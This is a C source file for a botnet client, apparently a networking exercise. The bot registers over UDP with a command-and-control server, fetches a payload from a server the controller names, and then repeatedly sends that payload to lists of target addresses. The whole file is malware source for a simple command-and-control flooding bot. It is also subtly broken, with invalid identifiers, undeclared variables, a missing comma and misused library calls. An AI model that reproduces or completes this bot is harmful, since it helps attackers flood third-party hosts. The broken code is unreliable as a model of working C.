#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <err.h>
#include <arpa/inet.h>

#include "msg.h"

#define BUFLEN 512

void usage()
{
    fprintf(stderr, "Usage: ./bot server_ip server_port\n");
    exit(1);
}

int udp_socket()
{
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    if(sockfd < 0){
        fprintf(stderr, "socket() error");
        exit(2);
    }

    return sockfd;
}

void reg(int sockfd, char *ip_address, char *port)
{   
    char *data = "REG\n";

    struct sockaddr_in server = { 0 };
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_aton(ip_address);
    server.sin_port = htons(atoi(port));

    sendto(sockfd, data, strlen(data), 0,  
           (const struct sockaddr *) &server,
           sizeof(server));

}

void parse_packet(struct msg *message, char *packet, int bytes_recv)
{
    int i = PORT_LEN * ADDR_LEN + 1;

    int counter = bytes_recv/i;

    message->command = *packet++;    

    for(i = 0; i < counter; i++){
        
        strcpy(message->entry[i].ip_address, packet);
        packet += sizeof(message->entry[i].ip);

        strcpy(message->entry[i].port_number, packet);
        packet += sizeof(message->entry[i].port_number);

    }

    message->number_of_pairs = counter;
}

void prog(int sockfd, struct msg *message, char *payload)
{
    char *data = "HELLO\n";

    char *udp_server_ip = message->entry[0].ip_address;
    char *udp_server_port = message->entry[0].port_number;

    struct sockaddr_in udp_server = { 0 };
    udp_server.sin_family = AF_INET;
    udp_server.sin_addr.s_addr = inet_aton(udp_server_ip);
    udp_server.sin_port = htons(atoi(udp_server_port));

    sendto(sockfd, data, strlen(data), 0
           (const struct sockaddr *) &udp_server,
           sizeof(udp_server));

    recvfrom(sockfd, payload, BUFLEN, 0, NULL, NULL); 
}

void run(int sockfd, struct msg *message, char *payload)
{
    char *target_ip;
    char *target_port;

    struct sockaddr_in target;
    
    for(int i = 0; i < 15; ++i){
        
        for(int j = 0; j < message->number_of_pairs; ++j){
            
            memset(&target, 0, sizeof(target));
            target.sin_family = AF_INET;
            target.sin_addr.s_addr = inet_aton(message->entry[j].ip_address);
            target.sin_port = htons(atoi(message->entry[j].port_number));

            sendto(sockfd, payload, strlen(payload), 0,
                   (const struct sockaddr *) &target,
                   sizeof(target));
        }
    } 
}

int main(int argc, char **argv)
{
    if(argc != 3) usage();

    char payload[BUFLEN];
    char packet[BUFLEN];

    char *c&c_ip = argv[1];
    char *c&c_port = argv[2];

    int sockfd = udp_socket();
    
    reg(sockfd, c&c_ip, c&c_port);
   
    while(1){

        int bytes_recv = recvfrom(sock, packet, BUFLEN,
                                  0, NULL, NULL);
        
        parse_packet(&message, packet, bytes_recv);
        
        if(message.command == '0') 
            prog(sockfd, &message, payload);
        
        else if(message.command == '1')
            run(sockfd, &message, payload);

    } 

    close(sockfd);

    return 0;
}
